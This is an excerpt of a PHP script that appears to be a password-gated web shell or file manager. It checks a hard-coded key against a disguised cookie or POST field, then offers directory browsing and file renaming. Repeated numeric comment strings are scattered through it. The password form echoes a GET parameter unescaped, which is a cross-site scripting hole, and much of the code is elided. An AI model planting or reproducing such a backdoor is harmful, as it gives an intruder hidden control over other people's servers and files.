...
$auth_key = "2d0009e82e2f8388dbad2c9a36dccd30";
...
$pass = false;
if (isset($_COOKIE['pw_name_88200'])) {
    if(($_COOKIE['pw_name_88200']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_88200'])) {
        if(($_POST['pw_name_88200']) == $auth_key) {
            setcookie("pw_name_88200", $_POST['pw_name_88200']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_88200' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724573985377642 1724573985455080 1724573985634372 1724573985447418
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724573985377642 1724573985455080 1724573985634372 1724573985447418
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724573985377642 1724573985455080 1724573985634372 1724573985447418
            $name = PATH . "/" . $_GET['r'];
